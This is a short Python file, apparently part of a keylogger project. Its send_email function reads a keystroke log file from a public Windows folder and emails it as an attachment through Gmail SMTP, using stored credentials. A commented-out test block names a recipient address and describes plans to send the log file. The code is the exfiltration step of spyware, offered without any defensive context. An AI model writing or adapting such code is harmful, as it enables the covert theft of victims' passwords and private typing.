import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv
import datetime

load_dotenv()

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")

def send_email(reciever,sub,body):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = reciever
        msg['Subject'] = sub

        msg.attach(MIMEText(body,'plain'))

        file = r"C:/Users/Public/Keylogs.txt"

        # attaching the log file
        with open(file, "r") as f:
            attachment = MIMEText(f.read(), "plain") 
            attachment.add_header("Content-Disposition", "attachment", filename=file)
            msg.attach(attachment)

        #sending the file
        with smtplib.SMTP(SMTP_SERVER,SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS,reciever,msg.as_string())
        
        print("Email sent")

    except Exception as e:
        print(f"Error: {e}")
       
# if __name__ == "__main__":
#     reciever = "bidya.gca@gmail.com"
#     sub = "Testing email"
#     body = "I hope you recieve it then i will modify it to send the file along with it"
#     send_email(reciever,sub,body)